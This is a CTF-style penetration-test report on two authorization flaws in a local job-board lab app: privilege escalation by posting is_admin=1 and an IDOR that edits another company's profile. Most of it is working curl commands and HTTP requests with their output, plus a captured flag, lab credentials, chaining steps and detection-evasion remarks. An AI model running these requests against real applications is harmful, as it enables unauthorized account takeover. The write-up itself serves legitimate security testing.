# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-02: Vertical Privilege Escalation via Unguarded Privilege Level Modification

**Summary:**
- **Vulnerable location:** POST `/edit_profile/{company_id}` endpoint
- **Overview:** Any authenticated standard user can escalate their privilege level from Regular (is_admin=0) to Admin (is_admin=1) by modifying the `is_admin` form parameter, bypassing client-side disabled field restrictions and server-side authorization checks
- **Impact:** Complete privilege escalation from standard user to admin user, granting unauthorized access to admin-only job listings containing the CTF flag: `flag{c131ab68-2257-46c7-bf43-a1df6742f4f7}`
- **Severity:** Critical

**Prerequisites:**
- Valid credentials for any standard user account (e.g., company3:password3)
- HTTP client (curl, browser with DevTools, or Burp Suite)

**Exploitation Steps:**

1. **Authenticate as standard user (company3)**
```bash
curl -X POST http://localhost:41169/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=company3&password=password3" \
  -c /tmp/cookies_c3.txt
```

**Expected Response:** HTTP 303 redirect to `/company/3/jobs` with `access_token` cookie set

2. **Verify current privilege level (standard user sees only 1 non-admin job)**
```bash
curl -s http://localhost:41169/company/3/jobs \
  -b /tmp/cookies_c3.txt \
  | grep -c "list-group-item"
```

**Expected Output:** `1` (only non-admin job visible)

3. **Exploit privilege escalation by setting is_admin=1**
```bash
curl -X POST http://localhost:41169/edit_profile/3 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cookies_c3.txt \
  -d "name=company3&is_admin=1"
```

**Expected Response:** HTTP 200 with message "Profile updated successfully"

**Technical Details:**
- The `is_admin` field is disabled client-side in the HTML form but can be bypassed by sending direct HTTP POST requests
- The server-side endpoint accepts the `is_admin` parameter without any authorization check
- No validation prevents standard users from modifying their own privilege level

4. **Verify privilege escalation (admin user now sees 2 jobs including admin-only listing)**
```bash
curl -s http://localhost:41169/company/3/jobs \
  -b /tmp/cookies_c3.txt \
  | grep -c "list-group-item"
```

**Expected Output:** `2` (both standard and admin jobs visible)

5. **Extract the CTF flag from admin job listing**
```bash
curl -s http://localhost:41169/company/3/jobs \
  -b /tmp/cookies_c3.txt \
  | grep -A2 "list-group-item"
```

**Proof of Impact:**

**Before Exploitation (Standard User View):**
```html
<li class="list-group-item">
    <p>company3 Job 1:company3 Job 1 Description</p>
</li>
```
- Job count: 1 (non-admin job only)

**After Exploitation (Admin User View):**
```html
<li class="list-group-item">
    <p>company3 Job 1:company3 Job 1 Description</p>
</li>
<li class="list-group-item">
    <p>secret:flag{c131ab68-2257-46c7-bf43-a1df6742f4f7}</p>
</li>
```
- Job count: 2 (includes admin job with flag)
- **Flag captured:** `flag{c131ab68-2257-46c7-bf43-a1df6742f4f7}`

**Notes:**
- The vulnerability exists because the server-side code accepts user-controlled `is_admin` parameter and directly assigns it to the database without authorization validation
- Client-side disabled attribute on the form field is trivially bypassed and provides no security protection
- The privilege change takes effect immediately without requiring re-authentication
- This vulnerability can be exploited through browser DevTools (removing the `disabled` attribute) or by sending raw HTTP requests

---

### AUTHZ-VULN-01: Horizontal Authorization Bypass (IDOR) - Cross-Company Profile Modification

**Summary:**
- **Vulnerable location:** POST `/edit_profile/{company_id}` endpoint
- **Overview:** Missing ownership validation allows any authenticated user to modify any other company's profile data by manipulating the `company_id` path parameter
- **Impact:** Complete unauthorized access to modify other companies' profile data (name and admin status), enabling account takeover, privilege manipulation, and data corruption across company boundaries
- **Severity:** High

**Prerequisites:**
- Valid credentials for any user account (e.g., company3:password3)
- Knowledge of target company ID (sequential IDs 1, 2, 3 make enumeration trivial)
- HTTP client (curl, browser with DevTools, or Burp Suite)

**Exploitation Steps:**

1. **Authenticate as attacker user (company3)**
```bash
curl -X POST http://localhost:41169/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=company3&password=password3" \
  -c /tmp/cookies_c3.txt
```

**Expected Response:** HTTP 303 redirect to `/company/3/jobs` with `access_token` cookie containing JWT for company_id=3

2. **Verify target company's profile before attack (company2)**

First, authenticate as company2 to get baseline:
```bash
curl -X POST http://localhost:41169/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=company2&password=ajsdasd987asd87as7da9" \
  -c /tmp/cookies_c2.txt
```

Check company2's current profile:
```bash
curl -s http://localhost:41169/edit_profile/2 \
  -b /tmp/cookies_c2.txt \
  | grep 'name="name" value='
```

**Expected Output:** `value="company2"` (original company name)

3. **Execute IDOR attack: Modify company2's profile using company3's session**
```bash
curl -X POST http://localhost:41169/edit_profile/2 \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cookies_c3.txt \
  -d "name=PWNED_BY_COMPANY3&is_admin=0"
```

**Expected Response:** HTTP 200 with message "Profile updated successfully"

**Technical Details:**
- The attacker (company3) sends a POST request to `/edit_profile/2` (company2's endpoint)
- The attacker's JWT token contains `{"sub": "3"}` (company_id=3)
- The server validates that the JWT is authentic but **fails to check** if token company_id (3) matches the path parameter company_id (2)
- The server proceeds to modify company2's profile using company3's credentials

4. **Verify unauthorized modification succeeded**
```bash
curl -s http://localhost:41169/edit_profile/2 \
  -b /tmp/cookies_c2.txt \
  | grep 'name="name" value='
```

**Expected Output:** `value="PWNED_BY_COMPANY3"` (modified by attacker)

**Proof of Impact:**

**Before IDOR Attack:**
- Company2's profile name: `company2`
- Attacker (company3) authenticated with JWT for company_id=3

**IDOR Attack Request:**
```http
POST /edit_profile/2 HTTP/1.1
Host: localhost:41169
Content-Type: application/x-www-form-urlencoded
Cookie: access_token="Bearer eyJhbGci....[JWT_FOR_COMPANY3]"

name=PWNED_BY_COMPANY3&is_admin=0
```

**After IDOR Attack:**
- Company2's profile name: `PWNED_BY_COMPANY3`
- Profile successfully modified by unauthorized user (company3)

**Evidence:**
```html
<!-- Before Attack -->
<input type="text" class="form-control" id="name" name="name" value="company2" required>

<!-- After Attack -->
<input type="text" class="form-control" id="name" name="name" value="PWNED_BY_COMPANY3" required>
```

**Notes:**
- The vulnerability exists because the POST `/edit_profile/{company_id}` endpoint validates JWT authenticity but does NOT validate that the JWT's company_id matches the path parameter company_id
- This contrasts with GET `/edit_profile/{company_id}` and GET `/company/{company_id}/jobs` endpoints which correctly implement ownership checks
- Sequential company IDs (1, 2, 3) make enumeration trivial - an attacker can iterate through all company IDs
- This vulnerability can be combined with AUTHZ-VULN-02 to grant admin privileges to arbitrary accounts: an attacker could modify another company's profile to set `is_admin=1`, effectively performing privilege escalation on behalf of the victim

---

## Exploitation Summary

**Total Vulnerabilities in Queue:** 2  
**Successfully Exploited:** 2  
**Exploitation Success Rate:** 100%

**Critical Findings:**
1. **AUTHZ-VULN-02 (Critical):** Vertical privilege escalation enabling unauthorized access to admin-only resources and CTF flag capture
2. **AUTHZ-VULN-01 (High):** Horizontal IDOR enabling cross-company profile manipulation and potential privilege escalation chaining

**Flag Captured:** `flag{c131ab68-2257-46c7-bf43-a1df6742f4f7}`

**Root Cause Analysis:**
Both vulnerabilities stem from inconsistent authorization enforcement patterns:
- GET endpoints correctly implement ownership checks: `if token_company_id != company_id: raise credentials_exception`
- POST `/edit_profile/{company_id}` omits this ownership check entirely
- No authorization check prevents users from modifying authorization-critical fields (is_admin/level)
- Client-side restrictions (disabled form fields) are not enforced server-side

**Chaining Potential:**
These vulnerabilities can be chained for amplified impact:
1. Attacker uses AUTHZ-VULN-01 to access another company's profile endpoint
2. Attacker uses AUTHZ-VULN-02 to escalate the target company's privileges
3. Result: Attacker can grant admin access to any account in the system

**Detection Evasion:**
- No audit logging exists - attacks leave no trace
- Single HTTP POST request per exploit - minimal network footprint
- Mimics legitimate user behavior (form submission)
- No rate limiting - bulk enumeration possible
